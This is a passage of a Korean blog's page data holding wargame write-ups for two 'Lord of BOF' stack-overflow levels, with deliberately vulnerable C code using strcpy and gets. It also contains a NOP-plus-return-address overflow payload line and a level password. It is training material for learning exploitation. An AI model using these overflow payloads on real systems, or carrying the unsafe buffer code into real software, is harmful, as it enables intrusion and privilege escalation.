class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span>\r\n    <span class=\"token function\">strcpy</span><span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">,</span> argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\n\"</span><span class=\"token punctuation\">,</span> buffer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>stack frame structure:</p>\n<p>| buffer[16] |\r\n| Stack Frame Pointer[4] |\r\n| Return Address[4] |\r\n| argc |\r\n| argv |\r\n| environ |</p>\n<p>이제 앞서 사용했던 직접 buffer에 삽입하는 방법은 사용할 수 없음을 알 수 있다. 쉘코드의 크기가 buffer의 크기를 넘어버리기 때문이다. 그렇기 때문에 argument를 활용하는 방식으로 권한 상승을 시도한다. gremlin의 경우처럼 디버깅을 가능하게 하기 위해 gremlin 소유의 디렉토리를 생성한 후 cobolt 실행파일을 복사한 후 디버깅을 진행한다. 다음은 gdb로 확인한 cobolt의 어셈블리어 코드이다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 432px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 129.6969696969697%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAaCAIAAAA44esqAAAACXBIWXMAAA7DAAAOwwHHb6hkAAADO0lEQVR42oVU25KkKBAtQeUqJYhyTcDq2f3/T9xAa7tn+qGHJyOMEyfPJfORIKecnA85J3scKYVlkdporbXZjHoqQihjzFqr1PL49j7+/cd7Zzabcy4FAIBSKpeFC84YFYtcFsk550IopdAw/AFuHx+1QojR7rbUGqNnjBFKOGcxxVWv2ujzrFJKxhlCw/A7PtdaILsQ1FPFDM4dq9ZoeIzTFGJAaOBCtlb3fQfIGKE/mMt5ltKZjTFQawh+sxYNCGEMBRgjXMra6rbv59mcOzhnj8dj+ATXWlLO2/YGe+/necIY+xAwRkLK89ViSjEl3/+6RSkueAdDqzfzuq4x5+PYnXeEzAihmKIQnHF+frxSShmKlIJSyjkfx/EC1wqQfeje5FK8d9baC4xTTtM0cSFKAeedD15I8VRKLssbfI8dUzTblkt1zsWUCCG4ay7iCul8nf2Dc9Qf/jK8XuAMcGuO0fsQCJkHhDIAo/QGdyeCF4Ibowkhn1GVe2yt15DScew+hHmeEMa+R4WEkCnF63m5LMsiv6KC1gAghGiMhtq6nRczxmMugBDmQty6Si1C9vF7VPfo9fVqrWYAa7celXchxg4eRyhA5plS+vHrl1KLNnr5Vu9uWOs5G6Nz6TmnyzCEUMqZkFkIeb4+9Gb0ZpRS7tiFEHa3lNG35p6z7jk7dxzumOcZYRRS5IwxzmtrQghCKWNUSsE4u4vwKK1ByTElbUwu1fsjXJpRdzvT3932jnEmF7muT4zxFdXrHZW12wV2KWf6HjthjHkf+xVTqq0qpazdhBTGaErJA85WCmTo3Y4A3h+9JPPNDELwS/Or7ykh0zSRuXtJKO0l+7+e4flUCXo9Qwz3YuScpeSM8fY6U04ZQKnlrs044i+3fQjrukL91Exu5nmee85n9b6nwLthkguO8fiuZ2s1xKCNLq0FfzjvKCX3Vq16HYYBjyPCeBzH4dsN65ekr2RY12fM0FfSHXe3j2OfpvHxw+uaS3bePZ9PaP1WHMdOKemLkXrVfgLX19nOGkLQ/Qw17zvzDU5/BZe35tiZa/POOe+vsTGU/BcwtGZ3azYTY6zneRzW7ntKcRiGO+0fwP8B3m1e2ZcdYckAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/c4e93c828ba48a65e888ab36393de1fd/c9b55/0.webp 165w,\n/static/c4e93c828ba48a65e888ab36393de1fd/f2908/0.webp 330w,\n/static/c4e93c828ba48a65e888ab36393de1fd/0bafe/0.webp 432w\"\n              sizes=\"(max-width: 432px) 100vw, 432px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/c4e93c828ba48a65e888ab36393de1fd/04c57/0.png 165w,\n/static/c4e93c828ba48a65e888ab36393de1fd/d9ecf/0.png 330w,\n/static/c4e93c828ba48a65e888ab36393de1fd/0e0c3/0.png 432w\"\n            sizes=\"(max-width: 432px) 100vw, 432px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/c4e93c828ba48a65e888ab36393de1fd/0e0c3/0.png\"\n            alt=\"disas\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>앞과 동일하게 main+3에 breakpoint를 걸어준 후 두 개의 argument를 python으로 입력하여 buffer의 주소와 argv[2]의 주소를 찾도록 한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 643px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 24.848484848484848%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAxUlEQVR42lWOy66DMAwFHSfcEgIh5Imd+C74/4+soFKlntWszgwMkVxSrTWEfds2770xRilUiA8orbVSCn8HAL13GDJqLbUWYkopiUg7Wy75OA5i2sNeSo4xOudKyeHYc8nzPFtrr+sC72/b6/W3+W1dnffeLtYYo7UGAERUj/cr/wAAiAhw59ZqTCmEkFKy9xZr7TRN+AR/LvSXtTbTdGdzhy5j/EuMERGJqY/hnAOAdjbuvD580knMdlmUUsQ0RIwxRPQGcG0OX0OAmVwAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/72826d35699e8fbf11a0b0cdd703998f/c9b55/1.webp 165w,\n/static/72826d35699e8fbf11a0b0cdd703998f/f2908/1.webp 330w,\n/static/72826d35699e8fbf11a0b0cdd703998f/b1337/1.webp 643w\"\n              sizes=\"(max-width: 643px) 100vw, 643px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/72826d35699e8fbf11a0b0cdd703998f/04c57/1.png 165w,\n/static/72826d35699e8fbf11a0b0cdd703998f/d9ecf/1.png 330w,\n/static/72826d35699e8fbf11a0b0cdd703998f/b5bda/1.png 643w\"\n            sizes=\"(max-width: 643px) 100vw, 643px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/72826d35699e8fbf11a0b0cdd703998f/b5bda/1.png\"\n            alt=\"argv addr1\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>(중략)</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 604px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 29.6969696969697%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAIAAABM9SnKAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA60lEQVR42kXP227DIBAE0JGCHTW1iw0YdjGwXPL/31jF6WXej2YGfYzxHMQBQGCSKmc6AehtKyK55OlKEWm9aa0BEFPrjYiQck4lW2sA7MYws/cewLKuMUaOPE2TUoqIUk7rugJw7kgpWedwlsyR930HYKzhGH/wsjAzMU/zrJQKRPE8l2W5sIsxGmvRnkOqvEEgqq3+zZZWi8g839U0lSJtdL1tADjG1ltgQhuj9hbCG4d/rLXUKlXu9xfOJb8+/+I++gsHpsMfWn9dbdp7b60F8PF4uMM555RSt9vNOXcc7vOavZndB7/t+zdbhho1giBL/gAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/fbb984ce8cd0363421309854f1aa1854/c9b55/2.webp 165w,\n/static/fbb984ce8cd0363421309854f1aa1854/f2908/2.webp 330w,\n/static/fbb984ce8cd0363421309854f1aa1854/059a8/2.webp 604w\"\n              sizes=\"(max-width: 604px) 100vw, 604px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/fbb984ce8cd0363421309854f1aa1854/04c57/2.png 165w,\n/static/fbb984ce8cd0363421309854f1aa1854/d9ecf/2.png 330w,\n/static/fbb984ce8cd0363421309854f1aa1854/87254/2.png 604w\"\n            sizes=\"(max-width: 604px) 100vw, 604px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/fbb984ce8cd0363421309854f1aa1854/87254/2.png\"\n            alt=\"argv addr2\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>argv[2]의 시작 주소가 0xbffffc01인 것을 알 수 있다. 이제 원본 cobolt에서 gremlin의 경우와 같이 exploit을 진행한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 643px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 22.424242424242426%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAzElEQVR42k3IXWuDMBTG8YAcjakS9Wh27EXSYrqLri+smYPOFarsogw06/f/MqPCYL+LPzwPQ8SiKJRSaZoiYlmWSlUFopQSEYlIPal6VqlqPksikjI7HI/s1Z3cm2vf25Nz3Wc3+nH6maa7H/3o7/72fesuH+fu3A/98DW41m1ftrv9bvO8ufZX1timsY02+sFoszbGmMc0erVe1ct6sRBCiDzPqCYpZRAEAMAY00YzIsryjPM4/MM5D8MQAKKZiOMoiuJ/TZIEAKy1v/liGvgxq0AMAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/452997115c52cb255597e7a8928b077b/c9b55/3.webp 165w,\n/static/452997115c52cb255597e7a8928b077b/f2908/3.webp 330w,\n/static/452997115c52cb255597e7a8928b077b/b1337/3.webp 643w\"\n              sizes=\"(max-width: 643px) 100vw, 643px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/452997115c52cb255597e7a8928b077b/04c57/3.png 165w,\n/static/452997115c52cb255597e7a8928b077b/d9ecf/3.png 330w,\n/static/452997115c52cb255597e7a8928b077b/b5bda/3.png 643w\"\n            sizes=\"(max-width: 643px) 100vw, 643px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/452997115c52cb255597e7a8928b077b/b5bda/3.png\"\n            alt=\"argv addr2\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 131px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 35.87786259541985%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABN0lEQVR42m2Na0/CMBhG33Z0bAi6MBG3rtva3bq1uwBjgCh+Q+P//0GKMZgYz8fz5OSBpl+FYRhQLxaiKLJcSteZThw3L3L/cXF751DqhVHEAp8yJhJhmgSu9MeD0s3Qr3RTa101XetM7emC7o+7ukpty1r3XdN1Q78qVbXddOOx+RvfunMAQAhhjE1zjDEmxDQJQQZZLh/sycR157Zlwb+8nM/Pp9fjftOuNm8f77PZDQ15nnIwzN1+aNf9/jCwwAMAwzBGhoExRhghhC6xc+8CACGEjC6XPxYAfUuE8YiQq/xLN/QR54JHLGTrdROFLIi54HEiYgBgMc/yTNc6E5FHfVmVSZqkmYz4ZYWiVnmp2kb7vqdUmaVJLBJZlcO2A4C0kLVWx9NTowrKmK5VIaWUpR/Qr/gT4QEmEx8xfgQAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/320d37d945e4b200ed9f89755220e3b2/40151/4.webp 131w\"\n              sizes=\"(max-width: 131px) 100vw, 131px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/320d37d945e4b200ed9f89755220e3b2/658fe/4.png 131w\"\n            sizes=\"(max-width: 131px) 100vw, 131px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/320d37d945e4b200ed9f89755220e3b2/658fe/4.png\"\n            alt=\"argv addr2\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>my-pass: hacking exposed</p>","categories":["writeup","wargame","pwnable"],"date":"February 05, 2016","description":"","id":"3fff3f40-679b-5be0-a6b2-281f2c6be589","keywords":["lob"],"slug":"/Lord-of-BOF-WriteUp-02/","title":"LOB 2번 (gremlin -> cobolt)","readingTime":{"text":"2 min read"}},{"banner":{"alt":null,"caption":null,"src":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","backgroundColor":"#080808","images":{"fallback":{"src":"/static/614058780ef653f69e69187ded16316d/92689/0.png","srcSet":"/static/614058780ef653f69e69187ded16316d/89005/0.png 119w,\n/static/614058780ef653f69e69187ded16316d/54264/0.png 238w,\n/static/614058780ef653f69e69187ded16316d/92689/0.png 476w","sizes":"(min-width: 476px) 476px, 100vw"},"sources":[{"srcSet":"/static/614058780ef653f69e69187ded16316d/91c48/0.webp 119w,\n/static/614058780ef653f69e69187ded16316d/918cd/0.webp 238w,\n/static/614058780ef653f69e69187ded16316d/f753e/0.webp 476w","type":"image/webp","sizes":"(min-width: 476px) 476px, 100vw"}]},"width":660,"height":399.327731092437}}}},"body":"<p>source code:</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">﻿<span class=\"token comment\">/*\r\n        The Lord of the BOF : The Fellowship of the BOF\r\n        - goblin\r\n        - small buffer + stdin\r\n*/</span>\r\n\r\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\r\n<span class=\"token punctuation\">{</span>\r\n    <span class=\"token keyword\">char</span> buffer<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\r\n    <span class=\"token function\">gets</span><span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\n\"</span><span class=\"token punctuation\">,</span> buffer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>Stack frame structure:</p>\n<p>| buffer[16] |\r\n| Stack Frame Pointer[4] |\r\n| Return Address[4] |\r\n| argc |\r\n| argv |\r\n| eviron |</p>\n<p>이전과는 다르게 strcpy 함수가 아닌 gets함수를 사용하였다. gets 함수는 프로그램이 실행된 이후에 입력값을 받기 시작하기 때문에 이제까지 썼던 방법으로 인자값 및 쉘코드를 전달할 수 없다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 476px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 7.2727272727272725%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAABCAIAAABR8BlyAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAANElEQVR42h3Bxw3AMAwEsDzUfEWZJ/svFsDkgw8K6hVJWTNjCzhVteu51u7uiCR5LgCZ+QNTFgJqbLUzkQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/614058780ef653f69e69187ded16316d/c9b55/0.webp 165w,\n/static/614058780ef653f69e69187ded16316d/f2908/0.webp 330w,\n/static/614058780ef653f69e69187ded16316d/cf53a/0.webp 476w\"\n              sizes=\"(max-width: 476px) 100vw, 476px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/614058780ef653f69e69187ded16316d/04c57/0.png 165w,\n/static/614058780ef653f69e69187ded16316d/d9ecf/0.png 330w,\n/static/614058780ef653f69e69187ded16316d/f2205/0.png 476w\"\n            sizes=\"(max-width: 476px) 100vw, 476px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/614058780ef653f69e69187ded16316d/f2205/0.png\"\n            alt=\"goblin\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>입력값을 이미 넘겨 주었으나 입력값을 받기 위해 대기하고 있는 것을 볼 수 있다. 입력값이 위와 같은 방법으로는 넘어가지 않는 것을 확인하였다. 이번엔 파이프를 사용하여 값을 넘겨보았다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 492px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 9.696969696969697%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAIAAADXZGvcAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAUElEQVR42o3LMQ7AIAgAQBoTB0SwyoY0WP//x8Yf9PaDOc19mpk/3u8mIsy1MqkORMw5y8FEJK2VUlJKiKg6iAjWG2tFROy9VTvzufDDBfAB2HwF3NfmtwMAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/69bc3cb18d6e4c2985afc223e5cd48fc/c9b55/1.webp 165w,\n/static/69bc3cb18d6e4c2985afc223e5cd48fc/f2908/1.webp 330w,\n/static/69bc3cb18d6e4c2985afc223e5cd48fc/9d6da/1.webp 492w\"\n              sizes=\"(max-width: 492px) 100vw, 492px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/69bc3cb18d6e4c2985afc223e5cd48fc/04c57/1.png 165w,\n/static/69bc3cb18d6e4c2985afc223e5cd48fc/d9ecf/1.png 330w,\n/static/69bc3cb18d6e4c2985afc223e5cd48fc/5c6e9/1.png 492w\"\n            sizes=\"(max-width: 492px) 100vw, 492px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/69bc3cb18d6e4c2985afc223e5cd48fc/5c6e9/1.png\"\n            alt=\"pipe\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>이상 없이 완료된 것을 볼 수 있다. 아래는 gdb로 본 goblin의 어셈블리어이다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 421px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 71.51515151515152%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAIAAACgpqunAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAB1ElEQVR42n2T626kMAxGE0iYASa3IVfbCdCOtu//hiug1W612n7/j3w+2WZt33NOKRcfPNVaSp7n+XEmxOCDt9ZWQmO0NkZKyf4OtUoV27paZ6nWnLPSinPGOcdKj8cs5PB6f7PWLE8nRP8Nrq0BlLauzlkkSjl57/u+55zlUm63QUixrQ2JPj5+xRiklIM8IoRgSAQISKS0AoSYYgih6zrGWExJqYeQct1WY+1RRqmnc8Zoa62xhlFtiICVtNbX5BDDMAyMsQLwdE4Ise3bwWh9uw3G6HEc/3TGr8m1tZxTTGkc74yxDDBNoxBiXVsu8Hq9K620UtM0Dqc7o9YACxKZozMe2imN9xtjLOX8mOdLewn+uSzamGVZDmXnTm0igBO29ugcow/hfsKA4MPSC7Hv+9M5pdRwG76vqlYkBKpGK6w1lxxivF/aBbTWQsp935Bo2zZj9LI4H/w0T+eqagMEQLJWU60pp3Rof8LW2b7vQ/Ba6xD8MEjOedd1nPPPyYBQEI1RQBRTLKVcsPfeOcd+CFVCgMPQaCCMMcaUplM7fJXn/Do5/i9ciRCpGnPsOedUoFzMcZ5Xt/+lbVuMIeacct7fjicJKaUcu66bHw8pxQ/wb9eZMM57ZAz4AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/d3b601772bad847d84a2666142333236/c9b55/2.webp 165w,\n/static/d3b601772bad847d84a2666142333236/f2908/2.webp 330w,\n/static/d3b601772bad847d84a2666142333236/ced8d/2.webp 421w\"\n              sizes=\"(max-width: 421px) 100vw, 421px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/d3b601772bad847d84a2666142333236/04c57/2.png 165w,\n/static/d3b601772bad847d84a2666142333236/d9ecf/2.png 330w,\n/static/d3b601772bad847d84a2666142333236/092ed/2.png 421w\"\n            sizes=\"(max-width: 421px) 100vw, 421px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/d3b601772bad847d84a2666142333236/092ed/2.png\"\n            alt=\"disas\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>이전 문제에서 했던 것처럼 argument에 shellcode를 적재하여 공격을 시도하고자 하여, argument를 주었을 시 프로그램 내에 잘 적재가 되는지 확인해 보았다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 26.666666666666668%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAvklEQVR42oWPyXLEIAxEhfGYRWIxBlETbPD8/0+mcJJz3qmr1N2SoI/OtaQj5ZK99ykl50g+wL/UWmMM+x5rZSLiWkvJ+emyaJ13SmsfvDFaqY0IrbWIuKlthkOMYc4MIvoQLFpjNBFprcUfyyIFgABYHoQQv5vHPb5aY2YfPFeO++6ck1LqWYFIKKdf4qPXdf6ChM47Ywz00a+7cykAUJjH536/689FV7/a2V6vdVPq6ufZLyIEgHa2PvqRj2836A2oUFNdBgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/ffb7a6a23d7bc106525f73fdcfada603/c9b55/3.webp 165w,\n/static/ffb7a6a23d7bc106525f73fdcfada603/f2908/3.webp 330w,\n/static/ffb7a6a23d7bc106525f73fdcfada603/ff4b8/3.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/ffb7a6a23d7bc106525f73fdcfada603/04c57/3.png 165w,\n/static/ffb7a6a23d7bc106525f73fdcfada603/d9ecf/3.png 330w,\n/static/ffb7a6a23d7bc106525f73fdcfada603/32056/3.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/ffb7a6a23d7bc106525f73fdcfada603/32056/3.png\"\n            alt=\"argument addr\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>(중략)</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 605px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 26.666666666666668%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAqklEQVR42nXN0XLCIBAF0MvEUBOLthhg9wKL//+VjunUPPkBZw5smD1MSgYQ77H2pioAvkNgq6ycT/PsfW2tmy3rCueUtGG3nxtsjNZbShuA3xhFNZcCIIRAspQyTZP3XlSVPC9n55yIkAwh7Nh6yumNU85/WMkiB+YLLwe+XmHDuvW8g3+cjlnk47zjseMXiDGy1iLyxkqdppP/8my1W1svK+BExR7jvm1PY/YUkf90qQwAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/c5d5ccc6703af57920dc33d00a7e75b9/c9b55/4.webp 165w,\n/static/c5d5ccc6703af57920dc33d00a7e75b9/f2908/4.webp 330w,\n/static/c5d5ccc6703af57920dc33d00a7e75b9/a9b84/4.webp 605w\"\n              sizes=\"(max-width: 605px) 100vw, 605px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/c5d5ccc6703af57920dc33d00a7e75b9/04c57/4.png 165w,\n/static/c5d5ccc6703af57920dc33d00a7e75b9/d9ecf/4.png 330w,\n/static/c5d5ccc6703af57920dc33d00a7e75b9/90cbd/4.png 605w\"\n            sizes=\"(max-width: 605px) 100vw, 605px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/c5d5ccc6703af57920dc33d00a7e75b9/90cbd/4.png\"\n            alt=\"argument addr2\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>argument가 잘 적재된 것을 볼 수 있다. 시작 주소는 0xbffffc08이다. 공격을 아래와 같이 진행하였다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 642px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 12.121212121212121%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAIAAADXZGvcAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAWklEQVR42h3FSQoEIQwAwICHSQTbgNkbb/7/jYNdlwIziwxVyYxnPh6+ZNVbosLM8am33N3Dzb0q997MfM4BUxWR9eE5RdYYA+lCvPdO1KnfqLWG+ENEAMjMP03yCETJSlubAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/831a689513e0ce8483340a8f83115faa/c9b55/5.webp 165w,\n/static/831a689513e0ce8483340a8f83115faa/f2908/5.webp 330w,\n/static/831a689513e0ce8483340a8f83115faa/7eb86/5.webp 642w\"\n              sizes=\"(max-width: 642px) 100vw, 642px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/831a689513e0ce8483340a8f83115faa/04c57/5.png 165w,\n/static/831a689513e0ce8483340a8f83115faa/d9ecf/5.png 330w,\n/static/831a689513e0ce8483340a8f83115faa/1bba8/5.png 642w\"\n            sizes=\"(max-width: 642px) 100vw, 642px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/831a689513e0ce8483340a8f83115faa/1bba8/5.png\"\n            alt=\"exploit\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>공격이 성공하지 않았다. 원인은 gets함수가 받는 stdin을 파이프로 전달받는 과정에 있다. 위의 (python –c ‘print “\\x90” * 20 + “\\x10\\xfc\\xff\\xbf”’)를 그대로 stdin으로 넘겨준 후, 문자열 읽기를 끝내기 위해 stdin의 끝에 EOF를 달고 입력받는 것을 끝낼 것이다. 이런 과정이었다면 쉘은 실행되었으나 실행되자마자 종료되었을 것이다. 그래서 페이로드를 아래처럼 다시 작성하였다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 642px; \"\n    >\n      <span\n    